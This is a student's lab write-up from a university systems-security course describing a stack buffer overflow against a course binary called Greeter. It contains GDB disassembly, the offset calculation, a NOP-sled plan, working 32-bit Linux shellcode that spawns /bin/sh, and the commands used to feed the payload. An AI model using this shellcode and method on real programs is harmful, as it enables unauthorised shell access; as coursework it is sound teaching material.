Code developed under HPY417 - Systems and Information Security, ECE TUC 2020-21 Winter Sem.


	Konstantinos Pantelis	 -   	LAB41446433/Assignment 8
	2015030070
	Undergrad. Student@ECE TUC
	kpantelis@isc.tuc.gr
	github.com/apfel-das/securious-tuc 
	

	

	** Crafting a Buffer Overflow Attack **

	- We are able to crash input by typing consecutive random input [A's -> 0x41 will do].
	- So we migh be able to overwrite the return address of vulnerable function as per our needs.


	** GDB Analysis **

(gdb) disas readString
  Dump of assembler code for function readString:
   0x080488a5 <+0>:	push   %ebp
   0x080488a6 <+1>:	mov    %esp,%ebp
   0x080488a8 <+3>:	push   %ebx
   0x080488a9 <+4>:	sub    $0x34,%esp
   0x080488ac <+7>:	call   0x8048780 <__x86.get_pc_thunk.bx>
   0x080488b1 <+12>:	add    $0x9074f,%ebx
   0x080488b7 <+18>:	sub    $0xc,%esp
   0x080488ba <+21>:	lea    -0x2c(%ebp),%eax			
   0x080488bd <+24>:	push   %eax
   0x080488be <+25>:	call   0x80501a0 <gets>
   0x080488c3 <+30>:	add    $0x10,%esp
   0x080488c6 <+33>:	movl   $0x0,-0xc(%ebp)
   0x080488cd <+40>:	jmp    0x80488ed <readString+72>
   0x080488cf <+42>:	lea    -0x2c(%ebp),%edx
   0x080488d2 <+45>:	mov    -0xc(%ebp),%eax
   0x080488d5 <+48>:	add    %edx,%eax
   0x080488d7 <+50>:	movzbl (%eax),%eax
   0x080488da <+53>:	mov    %eax,%ecx
   0x080488dc <+55>:	mov    $0x80dacc0,%edx
   0x080488e2 <+61>:	mov    -0xc(%ebp),%eax
   0x080488e5 <+64>:	add    %edx,%eax
   0x080488e7 <+66>:	mov    %cl,(%eax)

   -lea    -0x2c(%ebp),%eax	-> 0x2c => 44 bytes to cover until the return addr.

  	 |-------------BUFFER---------|-- EBP --|-- retAddr --|

     0							  44

   - We know that by examining a run case ("x/24wx $esp") or by checking the diss - assembly.

   ** Constructing a payload **

   - Filling the buffer with No - Operation (0x90) creating the so called "No-Op Sledge/Window".
   - This will lead on right shifts for each 0x90 present.
   - We put our arbitary code shellcode next to the window's end.
   - Adding our EIP's address (Extended Instruct. Pointer) + <small offset>.
   - We end up always "falling into the No-Op sledge, instead of returning.

   - What too look for:

   		- 44 bytes for shellcode, No-Op sledge + some_offset bytes to reach out the returnAddr in order to return back to our buffer. 

   	** Constructing the payload payload payload **

 /*
		 * close(0) 
		 *
		 * 8049380:       31 c0                   xor    %eax,%eax
		 * 8049382:       31 db                   xor    %ebx,%ebx
		 * 8049384:       b0 06                   mov    $0x6,%al
		 * 8049386:       cd 80                   int    $0x80
		 *
		 * open("/dev/tty", O_RDWR | ...)
		 *
		 * 8049388:       53                      push   %ebx
		 * 8049389:       68 2f 74 74 79          push   $0x7974742f
		 * 804938e:       68 2f 64 65 76          push   $0x7665642f
		 * 8049393:       89 e3                   mov    %esp,%ebx
		 * 8049395:       31 c9                   xor    %ecx,%ecx
		 * 8049397:       66 b9 12 27             mov    $0x2712,%cx
		 * 804939b:       b0 05                   mov    $0x5,%al
		 * 804939d:       cd 80                   int    $0x80
		 *
		 * execve("/bin/sh", ["/bin/sh"], NULL)
		 *
		 * 804939f:       31 c0                   xor    %eax,%eax
		 * 80493a1:       50                      push   %eax
		 * 80493a2:       68 2f 2f 73 68          push   $0x68732f2f
		 * 80493a7:       68 2f 62 69 6e          push   $0x6e69622f
		 * 80493ac:       89 e3                   mov    %esp,%ebx
		 * 80493ae:       50                      push   %eax
		 * 80493af:       53                      push   %ebx
		 * 80493b0:       89 e1                   mov    %esp,%ecx
		 * 80493b2:       99                      cltd   
		 * 80493b3:       b0 0b                   mov    $0xb,%al
		 * 80493b5:       cd 80                   int    $0x80
 */

		char sc[] = 
		"\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
		"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
		"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

		main()
		{
			int (*f)() = (int (*)())sc; f();
		}

	** Recreate the payload ** 	

	- Used struct.pack in python2 to reverse the endianess.
	- Format offsets.
	- Preferabbly use python2 (still accessible via 2.7) since it's a bit more usefull when it comes on string/output handling.
	- Once injected the palyload, father process will execute one cmd, and then exit. This will lead on loss of the accessed terminal. Used the trick described in provided docs to resolve and keep alive.
	- Only managed to get local user priviledges, any attempt to "set uid(0)" will fail causing segmentation fault.

	** How to run **

	- Use the following cmd sequence.
		$python2 shell.py > exploit.txt
		$(cat exploit.txt ;cat)| ./Greeter
		$<any terminal cmd>

	- Or "make all"